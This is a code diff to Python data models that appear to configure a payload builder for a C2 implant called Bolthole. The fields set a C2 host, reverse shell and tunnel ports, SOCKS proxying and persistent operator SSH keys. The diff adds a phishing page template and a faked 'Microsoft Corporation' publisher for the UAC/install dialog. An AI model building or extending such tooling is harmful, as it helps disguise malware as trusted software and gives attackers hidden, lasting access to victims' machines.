@@ -19,11 +19,15 @@ class BoltholePayload(BaseModel):
     ssh_host: str       # C2 FQDN or IP
     ssh_user: str       # SSH username on C2
     ports: str          # comma-separated port scan order (e.g. "443,80,22,31337")
-    tunnel_port: int    # reverse shell forward port (default 31332)
-    socks_port: int     # remote dynamic SOCKS5 port (default 1080)
+    tunnel_port_range: str  # range of reverse tunnel ports to try, e.g. "31332-31345" or "31332"
+    socks_port: int         # remote dynamic SOCKS5 port (default 1080)
     startup_delay: int  # seconds to sleep before starting boltcon (default 5)
     reconnect_delay: int  # seconds to sleep between reconnect attempts (default 30)
     operator_pubkey: str = ""  # extra operator public keys appended to authorized_keys
+    phish_template: str = "it_portal"        # which phish page template to use
+    publisher: str = "Microsoft Corporation" # Publisher shown in UAC / install dialog
+    description: str = ""                    # Product description in manifest
+    icon: str = ""                           # Base64-encoded .ico to replace template icon
 
     @field_validator("files_prefix")
     @classmethod
@@ -38,7 +42,7 @@ class BoltholeC2ConfigRequest(BaseModel):
     ssh_host: str
     ssh_user: str
     ports: str = "443,80,22,31337"
-    tunnel_port: int = 31332
+    tunnel_port_range: str = "31332-31345"
     socks_port: int = 1080
     startup_delay: int = 5
     reconnect_delay: int = 30
